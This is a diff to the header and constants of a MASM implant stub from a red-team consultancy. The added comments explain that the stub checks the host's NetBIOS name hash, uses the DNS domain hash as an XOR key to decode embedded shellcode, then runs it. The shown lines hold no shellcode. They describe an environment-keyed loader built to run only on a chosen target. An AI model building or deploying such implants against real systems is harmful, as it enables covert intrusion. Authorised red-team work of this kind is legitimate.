@@ -1,6 +1,6 @@
 ; -----------------------------------------------------------------------------
 ; 
-;  Implant Stub Code - MASM EXE
+;  Implant Stub Code - Win32 Assembly Language (MASM) executable
 ;  (C) 2016 Stuart Morgan (@ukstufus) <stuart.morgan@mwrinfosecurity.com>
 ;  MWR InfoSecurity Ltd, MWR Labs
 ;
@@ -8,6 +8,13 @@
 ;  attacks. 
 ;
 ;  Compile this by running 'makeit.bat' from the same drive as a masm32 installation.
+;
+;  In its current form, it:
+;  1. Hashes the NetBIOS name of the computer it is being run on and compares this
+;     to a stored hash. It exits if they do not match.
+;  2. Hashes the DNS domain name of the computer it is being run on and xors the
+;     hash (concatenated with itself if necessary) against the included shellcode
+;  3. Executes the (xor'd) shellcode.
 ; 
 ; -----------------------------------------------------------------------------
 
@@ -53,7 +60,7 @@ MS_CALG_SHA1 equ 8004h
 MS_CALG_SHA1_HASHSIZE equ 20 ; The actual size of a returned SHA1 hash (20/0x14 bytes)
 
 ; The mutex name. "Local\" means per session. "Global\" means per system. Change it to whatever you want.
-strMutexName  db  "Global\Stufus",0    
+strMutexName  db  "Local\Stufus",0    
 
 ; The hash of the authorised NetBIOS computer name. Change this to the real hash.
 ; You can generate this with raw2src.py or manually if you prefer
